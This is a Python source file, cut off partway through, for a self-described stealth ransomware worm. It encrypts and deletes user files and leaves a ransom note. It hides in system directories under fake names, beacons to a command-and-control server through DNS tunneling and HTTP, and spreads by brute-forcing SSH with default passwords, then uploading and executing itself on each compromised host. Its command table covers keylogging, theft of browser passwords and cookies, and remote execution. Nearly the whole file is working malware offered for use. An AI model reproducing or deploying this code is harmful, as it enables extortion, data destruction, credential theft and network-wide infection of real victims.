#!/usr/bin/env python3
"""
Advanced Stealth Ransomware Worm with Complete C2 Command & Control
Fully integrated with all C2 commands for stealth operation
"""

import os
import sys
import json
import time
import socket
import base64
import hashlib
import platform
import subprocess
import threading
import sqlite3
import secrets
import logging
import shutil
import getpass
import random
import string
from pathlib import Path
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import queue
import signal
import uuid
import re
import tempfile

# Try to import optional dependencies
try:
    import win32file
    import win32con
    WINDOWS_API_AVAILABLE = True
except:
    WINDOWS_API_AVAILABLE = False

try:
    import paramiko
    import netifaces
    SSH_AVAILABLE = True
except:
    SSH_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except:
    REQUESTS_AVAILABLE = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False

# ============================================================
# CONFIGURATION
# ============================================================

CONFIG_DIR = os.path.expanduser('~/.system_update')
CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.json')
DB_FILE = os.path.join(CONFIG_DIR, 'worm_c2.db')
C2_SERVER = os.environ.get('C2_SERVER', 'your-c2-domain.com')
MAX_WORKERS = 20

# ============================================================
# STEALTH CONFIGURATION
# ============================================================

class StealthConfig:
    """Configuration for stealthy operation"""
    
    SYSTEM_FOLDERS = [
        'System Volume Information', 'Windows', 'ProgramData',
        'Application Data', 'Microsoft', 'Intel', 'NVIDIA', 'Adobe',
        'Google', 'Apple', 'Microsoft Shared', 'Common Files',
        'System32', 'syswow64', 'drivers', 'config', 'logs',
        'temp', 'cache', 'updates', 'backup', 'restore',
        'system', 'etc', 'var', 'usr', 'opt', 'home',
        'bin', 'sbin', 'lib', 'lib64'
    ]
    
    LEGITIMATE_NAMES = [
        'svchost.exe', 'explorer.exe', 'winlogon.exe',
        'services.exe', 'lsass.exe', 'csrss.exe',
        'taskhost.exe', 'dwm.exe', 'spoolsv.exe',
        'vmtoolsd.exe', 'vboxservice.exe',
        'kernel32.dll', 'ntdll.dll', 'user32.dll',
        'cmd.exe', 'powershell.exe', 'wmic.exe'
    ]
    
    DECOY_NAMES = [
        'ransomware_detection.log', 'virus_scan_results.txt',
        'malware_report.pdf', 'security_audit.xlsx',
        'threat_analysis.doc', 'cve_2024_patches.zip',
        'security_update.exe', 'antivirus_install.msi',
        'firewall_config.bat', 'intrusion_detection.ps1'
    ]

# ============================================================
# STEALTH DATABASE
# ============================================================

class StealthDatabase:
    """Encrypted SQLite database"""
    
    def __init__(self, db_path=DB_FILE):
        self.db_path = db_path
        self.key = self._get_or_create_key()
        self.init_database()
    
    def _get_or_create_key(self):
        key_file = os.path.join(CONFIG_DIR, 'db.key')
        os.makedirs(CONFIG_DIR, exist_ok=True)
        
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
            return key
    
    def _encrypt(self, data):
        f = Fernet(self.key)
        return f.encrypt(json.dumps(data).encode()).decode()
    
    def _decrypt(self, data):
        try:
            f = Fernet(self.key)
            return json.loads(f.decrypt(data.encode()).decode())
        except:
            return None
    
    def init_database(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS infections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT UNIQUE,
                data TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS encrypted_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                file_path TEXT,
                data TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                command_id TEXT UNIQUE,
                command TEXT,
                status TEXT DEFAULT 'pending',
                result TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id TEXT,
                data_type TEXT,
                data TEXT,
                timestamp TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def add_infection(self, host_id, data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO infections (host_id, data, timestamp)
            VALUES (?, ?, ?)
        ''', (host_id, self._encrypt(data), datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def add_encrypted_file(self, host_id, file_path, data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO encrypted_files (host_id, file_path, data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (host_id, file_path, self._encrypt(data), datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def add_command(self, command_id, command, target=None):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (command_id, command, status, timestamp)
            VALUES (?, ?, 'pending', ?)
        ''', (command_id, self._encrypt({'cmd': command, 'target': target}), 
              datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return command_id
    
    def get_pending_commands(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT command_id, command FROM commands WHERE status = 'pending'
            ORDER BY timestamp ASC
        ''')
        results = []
        for row in cursor.fetchall():
            results.append({
                'command_id': row[0],
                'command': self._decrypt(row[1])
            })
        conn.close()
        return results
    
    def mark_command_executed(self, command_id, result):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE commands SET status = 'executed', result = ?
            WHERE command_id = ?
        ''', (self._encrypt(result), command_id))
        conn.commit()
        conn.close()
    
    def add_collected_data(self, host_id, data_type, data):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO collected_data (host_id, data_type, data, timestamp)
            VALUES (?, ?, ?, ?)
        ''', (host_id, data_type, self._encrypt(data), datetime.now().isoformat()))
        conn.commit()
        conn.close()

# ============================================================
# STEALTH FILE SYSTEM
# ============================================================

class StealthFileSystem:
    """Manages stealthy file placement"""
    
    def __init__(self):
        self.config = StealthConfig()
        self.installation_path = None
        self.decoy_paths = []
    
    def find_stealth_location(self):
        """Find best stealth location"""
        locations = []
        
        if platform.system() == 'Windows':
            locations.extend([
                os.environ.get('WINDIR', 'C:\\Windows'),
                os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'Microsoft'),
                os.path.join(os.environ.get('SYSTEMROOT', 'C:\\Windows'), 'System32', 'drivers'),
            ])
        else:
            locations.extend([
                '/etc', '/usr/lib', '/var/lib', '/opt',
                '/usr/share', '/usr/local/lib', '/System/Library',
                '/Library/Application Support'
            ])
        
        for location in locations:
            if os.path.exists(location):
                stealth_name = self._generate_stealth_name()
                full_path = os.path.join(location, stealth_name)
                try:
                    os.makedirs(full_path, exist_ok=True)
                    if platform.system() == 'Windows' and WINDOWS_API_AVAILABLE:
                        win32file.SetFileAttributes(full_path, win32con.FILE_ATTRIBUTE_HIDDEN)
                    self.installation_path = full_path
                    return full_path
                except:
                    continue
        
        home = os.path.expanduser('~')
        full_path = os.path.join(home, '.' + self._generate_stealth_name())
        os.makedirs(full_path, exist_ok=True)
        self.installation_path = full_path
        return full_path
    
    def _generate_stealth_name(self):
        prefixes = ['System', 'MS', 'Win', 'Intel', 'Adobe', 'Google', 'Update']
        suffixes = ['Cache', 'Logs', 'Temp', 'Data', 'Storage', 'Backup']
        return random.choice(prefixes) + random.choice(suffixes) + str(random.randint(1000, 9999))
    
    def create_decoy_files(self, install_path):
        """Create decoy files"""
        for decoy_name in self.config.DECOY_NAMES:
            try:
                decoy_path = os.path.join(install_path, decoy_name)
                with open(decoy_path, 'w') as f:
                    f.write(f"Security Report\nGenerated: {datetime.now()}\nStatus: All systems operational\n")
                self.decoy_paths.append(decoy_path)
            except:
                pass
    
    def hide_process(self):
        """Hide process from task managers"""
        if platform.system() == 'Windows':
            try:
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW("Windows Service Host")
            except:
                pass

# ============================================================
# REDUNDANT C2 COMMUNICATION
# ============================================================

class RedundantC2:
    """Multi-channel C2 communication"""
    
    def __init__(self, db=None):
        self.db = db or StealthDatabase()
        self.c2_domain = C2_SERVER
        self.active_channel = None
        self.communication_channels = []
        self.setup_channels()
    
    def setup_channels(self):
        """Setup communication channels"""
        self.communication_channels = [
            ('dns', self.dns_tunnel),
            ('http', self.http_channel),
            ('https', self.https_channel),
        ]
        random.shuffle(self.communication_channels)
    
    def send_beacon(self, data):
        """Send beacon through multiple channels"""
        for channel_name, channel_func in self.communication_channels:
            try:
                if channel_func('beacon', data):
                    self.active_channel = channel_name
                    return True
            except:
                continue
        return False
    
    def dns_tunnel(self, action, data):
        """DNS tunneling"""
        encoded = base64.b64encode(json.dumps(data).encode()).decode()
        chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
        for chunk in chunks[:5]:
            try:
                domain = f"{chunk}.{action}.{self.c2_domain}"
                socket.gethostbyname(domain)
                return True
            except:
                continue
        return False
    
    def http_channel(self, action, data):
        """HTTP fallback"""
        try:
            response = requests.post(
                f"http://{self.c2_domain}/{action}",
                json=data,
                timeout=5,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            return response.status_code == 200
        except:
            return False
    
    def https_channel(self, action, data):
        """HTTPS fallback"""
        try:
            response = requests.post(
                f"https://{self.c2_domain}/{action}",
                json=data,
                timeout=5,
                verify=False,
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            return response.status_code == 200
        except:
            return False
    
    def receive_commands(self):
        """Receive commands through channels"""
        # Try DNS TXT records first
        try:
            import dns.resolver
            answers = dns.resolver.resolve(f"cmd.{self.c2_domain}", 'TXT')
            for answer in answers:
                for txt in answer.strings:
                    try:
                        return json.loads(base64.b64decode(txt).decode())
                    except:
                        pass
        except:
            pass
        return None

# ============================================================
# RANSOMWARE ENGINE
# ============================================================

class RansomwareEngine:
    """Ransomware encryption engine"""
    
    def __init__(self, db=None):
        self.db = db or StealthDatabase()
        self.stealth_fs = StealthFileSystem()
        self.config = self._load_config()
        self.host_id = self._get_host_id()
        self.install_path = self.stealth_fs.find_stealth_location()
        self.encrypted_ext = '.' + ''.join(random.choices(string.ascii_lowercase, k=5))
        self.ransom_note = 'system_restore_instructions.txt'
        
        self.stealth_fs.create_decoy_files(self.install_path)
        self.stealth_fs.hide_process()
    
    def _load_config(self):
        os.makedirs(CONFIG_DIR, exist_ok=True)
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        config = {
            'host_id': str(uuid.uuid4()),
            'password_hash': '',
            'files_encrypted': False,
            'installation_path': ''
        }
        self._save_config(config)
        return config
    
    def _save_config(self, config=None):
        if config:
            self.config = config
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f)
    
    def _get_host_id(self):
        if 'host_id' not in self.config:
            self.config['host_id'] = str(uuid.uuid4())
            self._save_config()
        return self.config['host_id']
    
    def _generate_salt(self):
        return secrets.token_bytes(32)
    
    def _hash_password(self, password, salt=None):
        if salt is None:
            salt = self._generate_salt()
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600000,
            backend=default_backend()
        )
        hash_value = kdf.derive(password.encode('utf-8'))
        salt_b64 = base64.b64encode(salt).decode('utf-8')
        hash_b64 = base64.b64encode(hash_value).decode('utf-8')
        return f"{salt_b64}:{hash_b64}"
    
    def _verify_password(self, password, stored_hash):
        try:
            salt_b64, hash_b64 = stored_hash.split(':')
            salt = base64.b64decode(salt_b64)
            stored_hash_bytes = base64.b64decode(hash_b64)
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=600000,
                backend=default_backend()
            )
            password_hash = kdf.derive(password.encode('utf-8'))
            return password_hash == stored_hash_bytes
        except:
            return False
    
    def _generate_key(self, password, salt=None):
        if salt is None:
            salt = self._generate_salt()
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=600000,
            backend=default_backend()
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))
        return key, salt
    
    def setup_encryption(self):
        """Setup encryption password"""
        print("\n🔐 ENCRYPTION SETUP")
        print("Password requirements:")
        print("- At least 12 characters")
        print("- Uppercase, lowercase, number, special character")
        print()
        
        while True:
            password = getpass.getpass("Enter encryption password: ")
            confirm = getpass.getpass("Confirm: ")
            
            if password != confirm:
                print("❌ Passwords don't match!")
                continue
            
            if len(password) < 12:
                print("❌ Password too short!")
                continue
            
            if not any(c.isupper() for c in password):
                print("❌ Need uppercase!")
                continue
            
            if not any(c.islower() for c in password):
                print("❌ Need lowercase!")
                continue
            
            if not any(c.isdigit() for c in password):
                print("❌ Need number!")
                continue
            
            if not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
                print("❌ Need special character!")
                continue
            
            break
        
        password_hash = self._hash_password(password)
        self.config['password_hash'] = password_hash
        self._save_config()
        
        print("\n✅ Setup complete!")
        print(f"💾 Host ID: {self.host_id}")
        return True
    
    def find_files_to_encrypt(self, root_dirs=None):
        """Find files to encrypt"""
        if root_dirs is None:
            if platform.system() == 'Windows':
                root_dirs = ['C:\\Users', 'C:\\ProgramData']
            else:
                root_dirs = ['/home', '/Users', '/opt']
        
        files = []
        for root_dir in root_dirs:
            if not os.path.exists(root_dir):
                continue
            try:
                for root, dirs, filenames in os.walk(root_dir):
                    if self.install_path in root:
                        continue
                    for filename in filenames:
                        file_path = os.path.join(root, filename)
                        if self._should_encrypt(file_path):
                            files.append(file_path)
                            if len(files) >= 1000:
                                return files
            except:
                continue
        return files
    
    def _should_encrypt(self, file_path):
        """Check if file should be encrypted"""
        try:
            if os.path.getsize(file_path) < 100:
                return False
        except:
            return False
        
        if os.path.abspath(file_path) == os.path.abspath(__file__):
            return False
        
        if file_path.endswith(self.encrypted_ext):
            return False
        
        if self.ransom_note in file_path:
            return False
        
        return True
    
    def encrypt_files(self, password=None):
        """Encrypt files"""
        print("\n🔒 ENCRYPTING FILES...")
        
        if not password:
            password = getpass.getpass("Enter encryption password: ")
        
        if not self._verify_password(password, self.config['password_hash']):
            print("❌ Invalid password!")
            return False
        
        files = self.find_files_to_encrypt()
        print(f"📁 Found {len(files)} files to encrypt")
        
        if not files:
            print("No files to encrypt!")
            return False
        
        key, salt = self._generate_key(password)
        fernet = Fernet(key)
        
        encrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                if len(data) < 100:
                    continue
                
                salt_len = len(salt).to_bytes(4, 'big')
                encrypted_data = fernet.encrypt(data)
                combined = salt_len + salt + encrypted_data
                
                encrypted_path = file_path + self.encrypted_ext
                with open(encrypted_path, 'wb') as f:
                    f.write(combined)
                
                os.remove(file_path)
                encrypted_count += 1
                
                self.db.add_encrypted_file(
                    self.host_id,
                    file_path,
                    {'size': len(data)}
                )
                
            except Exception as e:
                print(f"❌ Failed: {file_path} - {e}")
        
        self._create_ransom_note()
        self.config['files_encrypted'] = True
        self._save_config()
        
        print(f"\n✅ Encrypted {encrypted_count} files!")
        return True
    
    def _create_ransom_note(self):
        """Create ransom note"""
        note = f"""
============================================================
                     SYSTEM RESTORE INSTRUCTIONS
============================================================

Your files have been encrypted.

Encryption ID: {self.host_id}
Date: {datetime.now().isoformat()}

TO RESTORE YOUR FILES:
1. Contact: restore@example.com
2. Provide your Encryption ID
3. Receive your restore key

============================================================
"""
        locations = ['~', '/tmp', '/var/tmp']
        for location in locations:
            try:
                note_path = os.path.join(os.path.expanduser(location), self.ransom_note)
                with open(note_path, 'w') as f:
                    f.write(note)
            except:
                pass
    
    def decrypt_files(self, password=None):
        """Decrypt files"""
        print("\n🔓 DECRYPTING FILES...")
        
        if not password:
            password = getpass.getpass("Enter decryption password: ")
        
        if not self._verify_password(password, self.config['password_hash']):
            print("❌ Invalid password!")
            return False
        
        encrypted_files = []
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if file.endswith(self.encrypted_ext):
                    encrypted_files.append(os.path.join(root, file))
        
        if not encrypted_files:
            print("No encrypted files found!")
            return False
        
        decrypted_count = 0
        for file_path in encrypted_files[:100]:
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                
                salt_len = int.from_bytes(data[:4], 'big')
                salt = data[4:4+salt_len]
                encrypted_data = data[4+salt_len:]
                
                key, _ = self._generate_key(password, salt)
                fernet = Fernet(key)
                
                decrypted_data = fernet.decrypt(encrypted_data)
                original_path = file_path[:-len(self.encrypted_ext)]
                with open(original_path, 'wb') as f:
                    f.write(decrypted_data)
                
                os.remove(file_path)
                decrypted_count += 1
                
            except Exception as e:
                print(f"❌ Failed: {file_path} - {e}")
        
        self.config['files_encrypted'] = False
        self._save_config()
        
        print(f"\n✅ Decrypted {decrypted_count} files!")
        return True

# ============================================================
# WORM PROPAGATION
# ============================================================

class WormPropagation:
    """Worm propagation engine"""
    
    def __init__(self, db=None, ransomware=None):
        self.db = db or StealthDatabase()
        self.ransomware = ransomware
    
    def get_network_range(self):
        """Get local network range"""
        try:
            if SSH_AVAILABLE:
                interfaces = netifaces.interfaces()
                for interface in interfaces:
                    addrs = netifaces.ifaddresses(interface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            ip = addr['addr']
                            if not ip.startswith('127.'):
                                return '.'.join(ip.split('.')[:3]) + '.'
        except:
            pass
        return '192.168.1.'
    
    def get_current_ip(self):
        """Get current IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def scan_network(self):
        """Scan for hosts"""
        print("🔍 Scanning network...")
        network_prefix = self.get_network_range()
        local_ip = self.get_current_ip()
        hosts = []
        
        for i in range(1, 255):
            ip = f"{network_prefix}{i}"
            if ip == local_ip:
                continue
            try:
                cmd = ['ping', '-c', '1', '-W', '1', ip]
                with open(os.devnull, 'w') as devnull:
                    if subprocess.call(cmd, stdout=devnull, stderr=devnull) == 0:
                        hosts.append(ip)
            except:
                continue
        
        print(f"📊 Found {len(hosts)} hosts")
        return hosts
    
    def ssh_bruteforce(self, ip):
        """SSH brute force"""
        if not SSH_AVAILABLE:
            return False
        
        credentials = [
            ('root', 'root'), ('root', 'password'), ('root', '123456'),
            ('admin', 'admin'), ('admin', 'password'), ('user', 'user'),
            ('pi', 'raspberry'), ('ubuntu', 'ubuntu')
        ]
        
        for username, password in credentials:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password, timeout=5)
                
                print(f"✅ Success on {ip}: {username}:{password}")
                self._deploy_payload(ssh, ip)
                ssh.close()
                return True
            except:
                continue
        
        return False
    
    def _deploy_payload(self, ssh, ip):
        """Deploy payload via SSH"""
        try:
            # Upload ransomware
            sftp = ssh.open_sftp()
            payload_path = f"/tmp/{secrets.token_hex(8)}.py"
            sftp.put(__file__, payload_path)
            sftp.close()
            
            # Execute
            ssh.exec_command(f"python3 {payload_path} &")
            
            # Log infection
            self.db.add_infection(
                self.ransomware.host_id if self.ransomware else 'unknown',
                {'ip': ip, 'method': 'ssh'}
            )
            
            print(f"✅ Deployed to {ip}")
        except:
            pass
    
    def propagate(self):
        """Main propagation"""
        print("\n🐛 PROPAGATING...")
        hosts = self.scan_network()
        infected = 0
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.ssh_bruteforce, host) for host in hosts]
            for future in as_completed(futures):
                if future.result():
                    infected += 1
        
        print(f"✅ Infected {infected} hosts")
        return infected

# ============================================================
# C2 COMMAND HANDLER - ALL COMMANDS INTEGRATED
# ============================================================

class C2CommandHandler:
    """Complete C2 command handler with all commands"""
    
    def __init__(self, worm):
        self.worm = worm
        self.db = worm.db
        self.ransomware = worm.ransomware
        self.stealth_fs = worm.stealth_fs
        self.worm_prop = worm.worm
        
        # State variables
        self.keylogger_active = False
        self.keylog_data = []
        self.propagation_active = True
        self.ransom_amount = "0.5"
        self.ransom_currency = "BTC"
        self.payment_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        self.deadline = None
        self.active_operations = {}
        
        # Command routing table
        self.command_handlers = {
            # Core commands
            'status': self.handle_status,
            'heartbeat': self.handle_heartbeat,
            'self_destruct': self.handle_self_destruct,
            'update_config': self.handle_update_config,
            
            # Encryption commands
            'encrypt': self.handle_encrypt,
            'decrypt': self.handle_decrypt,
            'set_password': self.handle_set_password,
            'encryption_status': self.handle_encryption_status,
            
            # Propagation commands
            'propagate': self.handle_propagate,
            'scan_network': self.handle_scan_network,
            'stop_propagation': self.handle_stop_propagation,
            'propagation_status': self.handle_propagation_status,
            
            # Stealth commands
            'hide_self': self.handle_hide_self,
            'unhide_self': self.handle_unhide_self,
            'create_decoys': self.handle_create_decoys,
            'change_identity': self.handle_change_identity,
            
            # Data collection commands
            'collect_data': self.handle_collect_data,
            'download_file': self.handle_download_file,
            'upload_file': self.handle_upload_file,
            'screenshot': self.handle_screenshot,
            'keylog_start': self.handle_keylog_start,
            'keylog_stop': self.handle_keylog_stop,
            'keylog_download': self.handle_keylog_download,
            
            # Execution commands
            'execute': self.handle_execute,
            'execute_script': self.handle_execute_script,
            'kill_process': self.handle_kill_process,
            'list_processes': self.handle_list_processes,
            
            # Persistence commands
            'install_persistence': self.handle_install_persistence,
            'remove_persistence': self.handle_remove_persistence,
            'persistence_status': self.handle_persistence_status,
            
            # File system commands
            'file_search': self.handle_file_search,
            'file_delete': self.handle_file_delete,
            'file_move': self.handle_file_move,
            'directory_list': self.handle_directory_list,
            
            # Social engineering
            'display_message': self.handle_display_message,
            'fake_update': self.handle_fake_update,
            'fake_error': self.handle_fake_error,
            
            # Ransomware specific
            'display_ransom_note': self.handle_display_ransom_note,
            'change_ransom_amount': self.handle_change_ransom_amount,
            'change_payment_address': self.handle_change_payment_address,
            'deadline': self.handle_deadline,
            'decrypt_sample': self.handle_decrypt_sample,
            
            # Network commands
            'port_scan': self.handle_port_scan,
            'dns_enum': self.handle_dns_enum,
            'whois': self.handle_whois,
            
            # RAT commands
            'clipboard_get': self.handle_clipboard_get,
            'clipboard_set': self.handle_clipboard_set,
            'browser_passwords': self.handle_browser_passwords,
            'cookies': self.handle_cookies
        }
    
    def handle_command(self, command_data):
        """Main command dispatcher"""
        cmd_type = command_data.get('cmd')
        params = command_data.get('params', {})
        command_id = command_data.get('id', str(uuid.uuid4())[:8])
        
        print(f"📨 Command: {cmd_type} (ID: {command_id})")
        
        handler = self.command_handlers.get(cmd_type)
        if handler:
            try:
                result = handler(params)
                self._send_response(command_id, {'status': 'success', 'result': result})
            except Exception as e:
                self._send_response(command_id, {'status': 'error', 'error': str(e)})
        else:
            self._send_response(command_id, {'status': 'error', 'error': f'Unknown command: {cmd_type}'})
    
    def _send_response(self, command_id, response):
        """Send command response"""
        response_data = {
            'command_id': command_id,
            'response': response,
            'timestamp': datetime.now().isoformat()
        }
        self.worm.c2.send_beacon(response_data)
    
    # ============================================================
    # CORE COMMAND HANDLERS
    # ============================================================
    
    def handle_status(self, params):
        """Get worm status"""
        return {
            'host_id': self.ransomware.host_id,
            'version': '4.0',
            'os': platform.platform(),
            'hostname': socket.gethostname(),
            'install_path': self.ransomware.install_path,
            'files_encrypted': self.ransomware.config.get('files_encrypted', False),
            'propagation_active': self.propagation_active,
            'keylogger_active': self.keylogger_active,
            'timestamp': datetime.now().isoformat()
        }
    
    def handle_heartbeat(self, params):
        """Send heartbeat"""
        return {'status': 'alive', 'timestamp': datetime.now().isoformat()}
    
    def handle_self_destruct(self, params):
        """Self destruct"""
        if params.get('confirm') == True:
            threading.Thread(target=self._do_self_destruct).start()
            return {'status': 'self_destruct_initiated'}
        return {'error': 'Confirmation required'}
    
    def _do_self_destruct(self):
        """Perform self destruct"""
        print("💣 Self destructing...")
        try:
            if os.path.exists(self.ransomware.install_path):
                shutil.rmtree(self.ransomware.install_path)
            if os.path.exists(CONFIG_DIR):
                shutil.rmtree(CONFIG_DIR)
            sys.exit(0)
        except:
            pass
    
    def handle_update_config(self, params):
        """Update configuration"""
        config = params.get('config', {})
        for key, value in config.items():
            if key in self.ransomware.config:
                self.ransomware.config[key] = value
        self.ransomware._save_config()
        return {'status': 'updated', 'config': self.ransomware.config}
    
    # ============================================================
    # ENCRYPTION COMMAND HANDLERS
    # ============================================================
    
    def handle_encrypt(self, params):
        """Encrypt files"""
        password = params.get('password')
        if not password:
            return {'error': 'Password required'}
        threading.Thread(target=self.ransomware.encrypt_files, args=(password,)).start()
        return {'status': 'encryption_started'}
    
    def handle_decrypt(self, params):
        """Decrypt files"""
        password = params.get('password')
        if not password:
            return {'error': 'Password required'}
        threading.Thread(target=self.ransomware.decrypt_files, args=(password,)).start()
        return {'status': 'decryption_started'}
    
    def handle_set_password(self, params):
        """Set encryption password"""
        new_password = params.get('new_password')
        old_password = params.get('old_password')
        
        if not new_password:
            return {'error': 'New password required'}
        
        if self.ransomware.config.get('password_hash'):
            if not self.ransomware._verify_password(old_password, self.ransomware.config['password_hash']):
                return {'error': 'Invalid old password'}
        
        new_hash = self.ransomware._hash_password(new_password)
        self.ransomware.config['password_hash'] = new_hash
        self.ransomware._save_config()
        return {'status': 'password_updated'}
    
    def handle_encryption_status(self, params):
        """Check encryption status"""
        return {
            'files_encrypted': self.ransomware.config.get('files_encrypted', False),
            'password_set': bool(self.ransomware.config.get('password_hash'))
        }
    
    # ============================================================
    # PROPAGATION COMMAND HANDLERS
    # ============================================================
    
    def handle_propagate(self, params):
        """Propagate to other hosts"""
        targets = params.get('targets', [])
        threading.Thread(target=self._do_propagate, args=(targets,)).start()
        return {'status': 'propagation_started'}
    
    def _do_propagate(self, targets):
        """Perform propagation"""
        if targets:
            for target in targets:
                self.worm_prop.ssh_bruteforce(target)
        else:
            self.worm_prop.propagate()
    
    def handle_scan_network(self, params):
        """Scan network"""
        threading.Thread(target=self._do_scan_network).start()
        return {'status': 'scan_started'}
    
    def _do_scan_network(self):
        """Perform network scan"""
        hosts = self.worm_prop.scan_network()
        self.worm.c2.send_beacon({'scan_results': hosts})
    
    def handle_stop_propagation(self, params):
        """Stop propagation"""
        self.propagation_active = False
        return {'status': 'propagation_stopped'}
    
    def handle_propagation_status(self, params):
        """Check propagation status"""
        return {
            'propagation_active': self.propagation_active,
            'ssh_available': SSH_AVAILABLE
        }
    
    # ============================================================
    # STEALTH COMMAND HANDLERS
    # ============================================================
    
    def handle_hide_self(self, params):
        """Hide from detection"""
        if platform.system() == 'Windows' and WINDOWS_API_AVAILABLE:
            win32file.SetFileAttributes(self.ransomware.install_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        return {'status': 'hidden'}
    
    def handle_unhide_self(self, params):
        """Unhide"""
        if platform.system() == 'Windows' and WINDOWS_API_AVAILABLE:
            win32file.SetFileAttributes(self.ransomware.install_path, win32con.FILE_ATTRIBUTE_NORMAL)
        return {'status': 'unhidden'}
    
    def handle_create_decoys(self, params):
        """Create decoy files"""
        count = params.get('count', 10)
        created = 0
        for i in range(count):
            try:
                decoy_name = random.choice(StealthConfig.DECOY_NAMES)
                decoy_path = os.path.join(self.ransomware.install_path, decoy_name)
                with open(decoy_path, 'w') as f:
                    f.write(f"Security Report\nGenerated: {datetime.now()}\nStatus: OK\n")
                created += 1
            except:
                pass
        return {'created': created}
    
    def handle_change_identity(self, params):
        """Change identity"""
        new_name = params.get('new_name')
        if not new_name:
            return {'error': 'New name required'}
        
        new_path = os.path.join(os.path.dirname(self.ransomware.install_path), new_name)
        try:
            os.rename(self.ransomware.install_path, new_path)
            self.ransomware.install_path = new_path
            return {'status': 'identity_changed', 'new_path': new_path}
        except Exception as e:
            return {'error': str(e)}
    
    # ============================================================
    # DATA COLLECTION COMMAND HANDLERS
    # ============================================================
    
    def handle_collect_data(self, params):
        """Collect system data"""
        data_type = params.get('type', 'system_info')
        data = self._collect_system_data(data_type)
        self.db.add_collected_data(self.ransomware.host_id, data_type, data)
        return {'status': 'success', 'data': data}
    
    def _collect_system_data(self, data_type):
        """Collect specific data"""
        if data_type == 'system_info':
            return {
                'hostname': socket.gethostname(),
                'os': platform.platform(),
                'user': os.getlogin(),
                'cwd': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }
        elif data_type == 'file_list':
            files = []
            for item in os.listdir('.')[:50]:
                try:
                    files.append({
                        'name': item,
                        'size': os.path.getsize(item) if os.path.isfile(item) else 0
                    })
                except:
                    pass
            return {'files': files}
        elif data_type == 'processes':
            return {'processes': self._get_processes()}
        return {'error': f'Unknown type: {data_type}'}
    
    def _get_processes(self):
        """Get running processes"""
        processes = []
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(['tasklist'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[3:20]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) > 1:
                            processes.append({'name': parts[0], 'pid': parts[1]})
            else:
                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                for line in result.stdout.split('\n')[1:20]:
                    if line.strip():
                        parts = line.split()
                        if len(parts) > 1:
                            processes.append({'name': parts[10] if len(parts) > 10 else parts[0], 'pid': parts[1]})
        except:
            pass
        return processes
    
    def handle_download_file(self, params):
